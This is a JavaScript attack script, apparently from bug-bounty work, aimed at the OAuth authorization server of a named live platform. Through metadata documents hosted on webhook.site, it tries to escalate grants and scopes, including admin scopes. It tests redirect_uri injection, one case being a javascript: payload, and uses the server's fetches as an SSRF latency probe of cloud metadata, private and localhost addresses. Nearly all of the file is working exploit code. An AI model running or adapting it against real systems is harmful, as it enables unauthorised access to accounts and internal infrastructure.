const AS = "https://bugsecure-api.senintel.sn";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const form = (o) => Object.entries(o).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(v)).join("&");
const CH = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM";
const WEBHOOK_UUID = "3ef992c0-b173-407f-ab55-e3ea613a534a";
const BASE = "https://webhook.site/" + WEBHOOK_UUID;

async function publish(doc) {
  await fetch("https://webhook.site/token/" + WEBHOOK_UUID, { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ default_content: typeof doc === "string" ? doc : JSON.stringify(doc), default_content_type: "application/json" }) });
  await sleep(400);
}
async function authorize(label, extra = []) {
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", BASE);
  u.searchParams.set("redirect_uri", BASE + "/cb");
  u.searchParams.set("scope", "programs:read profile:read");
  u.searchParams.set("state", "bb-" + Math.random().toString(36).slice(2));
  u.searchParams.set("code_challenge", CH);
  u.searchParams.set("code_challenge_method", "S256");
  u.searchParams.set("resource", "https://bugsecure-api.senintel.sn");
  for (const [k, v] of extra) u.searchParams.append(k, v);
  const r = await fetch(u, { redirect: "manual" });
  const loc = r.headers.get("location") || "";
  const consent = loc.includes("/oauth/consent");
  console.log("  " + label.padEnd(50) + "HTTP " + r.status + (consent ? " CONSENT-OK (client CIMD accepte)" : " refuse: " + (loc.match(/code=([^&]+)/) || [])[1]));
  await sleep(1100);
  return consent;
}
async function token(label, body) {
  const t0 = Date.now();
  const r = await fetch(AS + "/oauth/token", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: form(body) });
  const txt = await r.text();
  const dt = Date.now() - t0;
  let scope = "";
  try { const p = JSON.parse(Buffer.from(JSON.parse(txt).access_token.split(".")[1], "base64url").toString()); scope = JSON.stringify(p); } catch {}
  console.log("  " + label.padEnd(50) + "HTTP " + r.status + " " + (dt + "ms") + "  " + txt.slice(0, 150).replace(/\s+/g, " ") + (scope ? "\n      claims: " + scope.slice(0, 260) : ""));
  await sleep(1100);
  return { r, txt, dt };
}

console.log("=== A) CIMD : le document peut-il activer client_credentials ? ===");
await publish({ client_id: BASE, client_name: "bb-cc", redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code", "refresh_token", "client_credentials"], response_types: ["code"], token_endpoint_auth_method: "none", scope: "programs:read profile:read reports:read reports:write" });
const okA = await authorize("CIMD avec client_credentials");
console.log("  -> client CIMD accepte ? " + okA);
await token("token grant_type=client_credentials", { grant_type: "client_credentials", client_id: BASE, scope: "programs:read profile:read reports:read reports:write" });
await token("token grant_type=client_credentials (no scope)", { grant_type: "client_credentials", client_id: BASE });

console.log("\n=== B) CIMD : token-exchange autorise pour ce client ? (oracle sur l erreur) ===");
await publish({ client_id: BASE, client_name: "bb-tx", redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code", "refresh_token", "urn:ietf:params:oauth:grant-type:token-exchange"], response_types: ["code"], token_endpoint_auth_method: "none" });
await authorize("CIMD avec token-exchange");
await token("token-exchange (subject bidon)", { grant_type: "urn:ietf:params:oauth:grant-type:token-exchange", subject_token: "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ4In0.", subject_token_type: "urn:ietf:params:oauth:token-type:access_token", client_id: BASE, resource: "https://bugsecure-api.senintel.sn" });
await token("token-exchange (client CLI, reference)", { grant_type: "urn:ietf:params:oauth:grant-type:token-exchange", subject_token: "eyJhbGciOiJub25lIn0.eyJzdWIiOiJ4In0.", subject_token_type: "urn:ietf:params:oauth:token-type:access_token", client_id: "bugsecure-mcp-cli", resource: "https://bugsecure-api.senintel.sn" });

console.log("\n=== C) CIMD : scopes elargis dans le document ===");
await publish({ client_id: BASE, client_name: "bb-scopes", redirect_uris: [BASE + "/cb"], grant_types: ["authorization_code", "refresh_token"], response_types: ["code"], token_endpoint_auth_method: "none", scope: "triage:read triage:write grade:write admin:read" });
await authorize("CIMD scope=admin/triage/grade");

console.log("\n=== D) taxonomie des erreurs = oracle de reponse ? ===");
const TAX = [
  ["JSON valide sans client_id", { client_name: "x", redirect_uris: [BASE + "/cb"] }],
  ["client_id different de l URL", { client_id: "https://webhook.site/autre", client_name: "x", redirect_uris: [BASE + "/cb"] }],
  ["texte non JSON", "ceci n est pas du json"],
  ["HTML", "<html><body>secret interne</body></html>"],
  ["JSON invalide", "{ broken json"],
  ["redirect_uris plateforme", { client_id: BASE, client_name: "x", redirect_uris: ["https://bugsecure.senintel.sn/oauth/consent"] }],
  ["redirect_uris IP literal", { client_id: BASE, client_name: "x", redirect_uris: ["https://1.2.3.4/cb"] }],
  ["redirect_uris javascript:", { client_id: BASE, client_name: "x", redirect_uris: ["javascript:alert(1)"] }],
];
for (const [n, doc] of TAX) {
  await publish(doc);
  const t0 = Date.now();
  const u = new URL(AS + "/oauth/authorize");
  u.searchParams.set("response_type", "code");
  u.searchParams.set("client_id", BASE);
  u.searchParams.set("redirect_uri", BASE + "/cb");
  u.searchParams.set("scope", "programs:read");
  u.searchParams.set("state", "bb");
  u.searchParams.set("code_challenge", CH);
  u.searchParams.set("code_challenge_method", "S256");
  const r = await fetch(u, { redirect: "manual" });
  const loc = r.headers.get("location") || "";
  const dt = Date.now() - t0;
  console.log("  " + n.padEnd(34) + "HTTP " + r.status + " " + String(dt + "ms").padStart(6) + "  " + loc.slice(0, 110));
  await sleep(1100);
}

console.log("\n=== E) SSRF atteignable en interne ? (side-channel de latence) ===");
const TIMED = [
  ["webhook (externe, OK)", BASE],
  ["169.254.169.254 (IMDS)", "http://169.254.169.254/latest/meta-data/"],
  ["10.255.255.1 (prive)", "http://10.255.255.1/"],
  ["192.0.2.1 (TEST-NET)", "http://192.0.2.1/"],
  ["127.0.0.1:80", "http://127.0.0.1/"],
  ["hote inexistant", "https://hote-inexistant-zzz.invalid/"],
  ["127.0.0.1:53682 (MCP)", "http://127.0.0.1:53682/.well-known/oauth-protected-resource/mcp"],
  ["localhost mot de passe", "http://localhost:8099/"],
];
for (const [n, url] of TIMED) {
  const ts = [];
  for (let i = 0; i < 3; i++) {
    const t0 = Date.now();
    try { const r = await fetch(url, { redirect: "manual", signal: AbortSignal.timeout(9000) }); await r.text(); ts.push(Date.now() - t0); }
    catch (e) { ts.push(Date.now() - t0); }
    await sleep(400);
  }
  console.log("  " + n.padEnd(32) + "latences=" + ts.join(",") + " ms  (vu depuis NOTRE poste, pas la cible)");
  await sleep(300);
}
console.log("\n  (la latence utile est celle du serveur de l AS : on la mesure via la reponse /oauth/authorize)");
console.log("=== F) latence MESUREE COTE AS (via /oauth/authorize) ===");
for (const [n, url] of TIMED) {
  const ts = [];
  for (let i = 0; i < 2; i++) {
    const t0 = Date.now();
    const u = new URL(AS + "/oauth/authorize");
    u.searchParams.set("response_type", "code");
    u.searchParams.set("client_id", url);
    u.searchParams.set("redirect_uri", BASE + "/cb");
    u.searchParams.set("scope", "programs:read");
    u.searchParams.set("state", "bb");
    u.searchParams.set("code_challenge", CH);
    u.searchParams.set("code_challenge_method", "S256");
    const r = await fetch(u, { redirect: "manual" });
    await r.text();
    ts.push(Date.now() - t0);
    await sleep(800);
  }
  console.log("  " + n.padEnd(32) + "latence AS=" + ts.join(",") + " ms");
}
